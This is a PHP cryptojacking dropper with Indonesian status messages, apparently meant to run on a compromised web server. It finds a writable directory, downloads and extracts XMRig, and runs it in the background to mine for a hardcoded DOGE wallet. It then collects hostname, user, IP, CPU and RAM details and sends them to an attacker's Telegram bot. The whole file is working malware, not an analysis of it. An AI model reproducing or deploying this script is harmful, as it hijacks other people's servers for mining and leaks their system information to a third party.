<?php
set_time_limit(0);
error_reporting(0);

$telegram_token  = "7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw";
$telegram_chatid = "5104210301";
$uname           = php_uname('n');
$whoami          = trim(shell_exec("whoami"));
$core_count      = intval(trim(shell_exec("nproc")));
$core_count      = $core_count > 0 ? $core_count : 1;
$wallet          = "DHti5q3g2QYS2tE2bPZVxaZWgkzjYKVMjz";

$ports           = [443, 3333, 5555, 9999]; // Fallback port list
$base_cmd        = "./xmrig -a rx -k -u DOGE:$wallet.$whoami --cpu-max-threads-hint=100";
$host            = "rx.unmineable.com";

$current_url     = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$base_dir        = dirname(__DIR__);
$check_dirs      = ['tmp', 'www', 'mail'];
$custom_dir      = __DIR__ . '/blog';
$folder          = null;

foreach ($check_dirs as $d) {
    $try = $base_dir . '/' . $d;
    if (is_dir($try) && is_writable($try)) {
        $folder = $try;
        break;
    }
}
if (!$folder) {
    if (!is_dir($custom_dir)) mkdir($custom_dir, 0755, true);
    if (!is_writable($custom_dir)) die("<pre>❌ Tidak bisa menulis ke $custom_dir</pre>");
    $folder = $custom_dir;
    echo "<pre>📂 Folder fallback: $folder\n";
} else {
    echo "<pre>📂 Menggunakan folder: $folder\n";
}
chdir($folder);
exec("pgrep -f xmrig", $already_running);

$folder_name = "xmrig-6.21.0";
$xmrig_folder_path = $folder . '/' . $folder_name;

if (!empty($already_running) && is_dir($xmrig_folder_path)) {
    echo "⚠️ XMRig sudah berjalan. Tidak dijalankan ulang.\n</pre>";
    $message = "⚠️ <b>XMRig sudah berjalan</b>\n🖥️ Hostname: <code>$uname</code>\n🧠 Core: $core_count\n📁 Folder: $xmrig_folder_path\n📛 PID(s): " . implode(", ", $already_running) . "\n🔗 <b>Script URL</b>: <a href=\"$current_url\">Open Script</a>";
    sendTelegram($telegram_token, $telegram_chatid, $message);
    exit;
}

if (!is_dir($xmrig_folder_path) && !empty($already_running)) {
    echo "⚠️ Folder hilang, tapi proses masih hidup. Melakukan setup ulang...\n";
}

echo "⬇️ Mengunduh XMRig...\n";
$remote_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz";
$filename = "xmrig.tar.gz";
$success = false;

if (shell_exec("which wget")) {
    exec("wget -q -O $filename $remote_url");
    $success = file_exists($filename);
}
if (!$success) {
    exec("curl -s -L -o $filename $remote_url");
    $success = file_exists($filename);
}
if (!$success) die("❌ Gagal mengunduh file XMRig.\n</pre>");

echo "✅ File diunduh: $filename\n";
echo "📦 Mengekstrak...\n";
exec("tar -xf $filename");
if (!is_dir($folder_name)) die("❌ Ekstraksi gagal.\n</pre>");

echo "✅ Ekstraksi berhasil: $folder_name\n";
chdir($xmrig_folder_path);
echo "🧠 Jumlah core CPU: $core_count\n";

// Fallback port attempt
$xmrig_pid = null;
foreach ($ports as $port) {
    $full_cmd = "$base_cmd -o stratum+ssl://$host:$port";
    if (shell_exec("which nohup")) {
        $cmd = "nohup $full_cmd > /dev/null 2>&1 &";
    } elseif (shell_exec("which setsid")) {
        $cmd = "setsid $full_cmd > /dev/null 2>&1 &";
    } else {
        $cmd = "$full_cmd > /dev/null 2>&1 &";
    }

    echo "🚀 Mencoba port $port...\n";
    exec($cmd);
    sleep(6); // Waktu jeda untuk memastikan proses sempat jalan

    exec("pgrep -fl xmrig", $check_pid);
    if (!empty($check_pid)) {
        $xmrig_pid = $check_pid;
        echo "✅ XMRig berhasil dijalankan pada port $port\n";
        break;
    } else {
        echo "❌ Gagal pada port $port, mencoba port berikutnya...\n";
    }
}

if ($xmrig_pid) {
    echo "✅ Proses XMRig berjalan:\n" . implode("\n", $xmrig_pid) . "\n</pre>";

    $ram_info    = trim(shell_exec("free -h | grep Mem | awk '{print \$2 \" (used: \" \$3 \", free: \" \$4 \")\"}'"));
    $cpu_cores   = trim(shell_exec("lscpu | grep '^CPU(s):' | awk '{print \$2 \" cores\"}'"));
    $cpu_threads = trim(shell_exec("lscpu | grep '^Thread(s) per core:' | awk '{print \$4 \" threads/core\"}'"));
    $uname_info  = trim(shell_exec("uname -a"));
    $ip_info     = trim(shell_exec("hostname -I | awk '{print \$1}'"));

    $message = "✅ <b>XMRig dijalankan sukses</b>\n"
             . "🖥️ <b>Hostname</b>: <code>$uname</code>\n"
             . "🧠 <b>CPU</b>: $core_count core(s)\n"
             . "🧪 <b>Info</b>: $cpu_cores | $cpu_threads\n"
             . "📦 <b>RAM</b>: $ram_info\n"
             . "👤 <b>User</b>: $whoami\n"
             . "🌐 <b>IP</b>: $ip_info\n"
             . "🔧 <b>System</b>: <code>$uname_info</code>\n\n"
             . "⛏️ <b>Process</b>:\n<code>" . implode("\n", $xmrig_pid) . "</code>\n\n"
             . "🔗 <b>Script URL</b>: <a href=\"$current_url\">Open Script</a>";
    sendTelegram($telegram_token, $telegram_chatid, $message);
} else {
    echo "❌ Semua port gagal. XMRig tidak dapat dijalankan.\n</pre>";
    sendTelegram($telegram_token, $telegram_chatid, "❌ <b>XMRig gagal dijalankan</b> di semua port.\n🔗 <a href=\"$current_url\">Script URL</a>");
}

function sendTelegram($token, $chatid, $msg) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = http_build_query([
        'chat_id' => $chatid,
        'text' => $msg,
        'parse_mode' => 'HTML'
    ]);
    $opts = ['http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded",
        'content' => $data
    ]];
    file_get_contents($url, false, stream_context_create($opts));
}
?>
